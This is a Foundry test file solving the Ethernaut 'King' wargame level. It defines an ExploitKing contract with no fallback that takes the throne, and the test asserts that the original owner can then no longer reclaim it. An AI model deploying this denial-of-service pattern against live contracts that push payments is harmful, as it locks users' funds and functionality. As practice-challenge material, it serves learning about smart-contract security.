// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/King.sol";


contract ExploitKing {
    function becomeKing(address king) external payable {
        (bool result,) = king.call{value:msg.value}("");
        if(!result) revert();
    }

    // No Fallback
}


contract TestKing is Test {
    King king;
    ExploitKing exploitKing;
    address deployer = address(0x51);
    address player1 = address(0x52);
    address player2 = address(0x53);

    function setUp() external {
        vm.deal(deployer, 1000 ether);
        vm.deal(player1, 1000 ether);
        vm.prank(deployer);
        king = new King{value: 1 ether}();
        exploitKing = new ExploitKing();
    }

    function testExploit() external {
        // test initial values
        assertEq(king.owner(), deployer);
        assertEq(king._king(), deployer);
        assertEq(king.prize(), 1 ether);

        // change player
        vm.prank(player1);
        (bool result,) = address(king).call{value: 1.1 ether}("");
        if(!result) revert();
        assertEq(king._king(), player1);
        assertEq(king.prize(), 1.1 ether);

        // test that king can be reset owner
        vm.prank(deployer);
        (result,) = address(king).call{value: 0}("");
        if(!result) revert();
        assertEq(king._king(), deployer);
        assertEq(king.prize(), 0);

        // change player to attacker contract
        exploitKing.becomeKing{value: 1 ether}(address(king));
        assertEq(king._king(), address(exploitKing));
        assertEq(king.prize(), 1 ether);

        // test that king cannot be be reset owner
        vm.prank(deployer);
        (result,) = address(king).call{value: 0}("");
        assertEq(result, false);
        assertEq(king._king(), address(exploitKing));
        assertEq(king.prize(), 1 ether);
    }
}
